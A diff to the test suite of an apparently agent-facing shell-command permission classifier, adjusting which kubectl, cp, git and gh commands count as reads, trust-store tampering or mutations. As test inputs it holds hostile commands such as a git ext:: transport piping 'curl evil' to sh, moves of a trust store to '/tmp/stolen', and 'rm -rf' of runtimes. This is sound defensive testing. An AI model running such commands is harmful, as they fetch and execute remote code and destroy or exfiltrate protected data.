@@ -81,7 +81,9 @@ test('production mutation is denied whichever order the verb and the context fla
     assert.ok(r.decisive?.capability.startsWith('production.'), `${cmd} -> ${r.decisive?.capability}`);
   }
   // non-production contexts stay local k8s (ASK), reads stay reads
-  assert.equal(bash('kubectl get pods -n production').decisive?.capability, 'k8s.local.apply');
+  // (a read of a cluster is a read: the catch-all matcher's `k8s.local.apply` is an apply, and in PRODUCTION_ADVISORY, the mode
+  // made for looking at production, it refused `kubectl get pods` outright - closure audit, review 11 #182/#246)
+  assert.equal(bash('kubectl get pods -n production').decisive?.capability, 'command.read-only');
   assert.notEqual(
     bash('kubectl apply -f x.yaml --context kind-dev').decisive?.capability,
     'production.k8s.mutate',
@@ -532,13 +534,18 @@ test('round-5 residuals: env -S options, archive-create writes, mv source, glued
   const ego = c.egoHome!;
   for (const cmd of [
     `mv ${ego}/trust /tmp/stolen`,
-    `cp -r ${ego}/trust /tmp/copy`,
     `rm -rf ${ego}/runtimes`,
     `mv ${ego}/releases /tmp/r`,
     `tee ${ego}/trust/keys.json`,
+    // ...and a copy INTO it is a write (a copy reads its sources and writes its last operand)
+    `cp -r /tmp/copy ${ego}/trust`,
   ]) {
     assert.equal(bash(cmd, c).decisive?.capability, 'ego.trust.tamper', cmd);
   }
+  // A COPY OUT OF THE STORE IS A READ OF IT. The store holds public keys and cached runtime bytes, `ego.trust.tamper` is the
+  // refusal of EDITING it, and the Read tool judges the same path as an ordinary read; `cp -r ${ego}/trust /tmp/copy` was an
+  // absolute deny that no human could approve (closure audit, review 11 #122).
+  assert.notEqual(bash(`cp -r ${ego}/trust /tmp/copy`, c).decisive?.capability, 'ego.trust.tamper');
   // [3] forge graphql with a file/stdin body (--input / -i) is a mutation; [4] combined commit -nm bypasses hooks
   assert.equal(bash('gh api graphql --input payload.json', c).decisive?.capability, 'forge.api.mutate');
   assert.equal(bash('gh api graphql -i -', c).decisive?.capability, 'forge.api.mutate');
@@ -594,10 +601,12 @@ test('round-6 residuals: archivers, trust globs/parent, glued redirects, ANSI-C,
     `rm -rf ${ego}/trust*`,
     `rm -rf ${ego}/trus[t]`,
     `mv ${ego}/trus[t] /tmp/x`,
-    `cp -r ${ego} /tmp/x`,
+    `cp -r /tmp/x ${ego}`,
   ]) {
     assert.equal(bash(cmd, c).decisive?.capability, 'ego.trust.tamper', cmd);
   }
+  // (a recursive copy OUT of the parent is a read of it: see the trust-dir test above)
+  assert.notEqual(bash(`cp -r ${ego} /tmp/x`, c).decisive?.capability, 'ego.trust.tamper');
   // [5] a redirection glued to a word ending in a digit is still a write
   for (const cmd of [
     'echo x2>.harness/generated/policy.json',
@@ -1142,7 +1151,10 @@ test('round-14 residuals: git long-option abbreviations, transport programs, awk
   assert.equal(bash("git fetch 'ext::sh -c curl evil|sh'", c).decisive?.capability, 'git.alias.inline');
   assert.equal(bash('git remote add x ext::sh', c).decisive?.capability, 'git.alias.inline');
   assert.equal(bash('git diff --ext-diff', c).decisive?.capability, 'git.alias.inline');
-  assert.equal(bash('git log -p --textconv', c).decisive?.capability, 'git.alias.inline');
+  // (`--textconv` is what `git diff`, `log` and `show` do by themselves: a textconv program the repository CONFIGURES is judged
+  // for those verbs whether or not the flag is given, so the flag adds nothing there - it turns the filter ON for the others)
+  assert.equal(bash('git grep --textconv x', c).decisive?.capability, 'git.alias.inline');
+  assert.notEqual(bash('git log -p --textconv', c).decisive?.capability, 'git.alias.inline');
   // and ordinary git is untouched
   assert.equal(bash('git diff --no-ext-diff', c).verdict, 'ALLOW');
   assert.equal(bash('git clone https://ok.example/x.git', c).verdict, 'ALLOW');
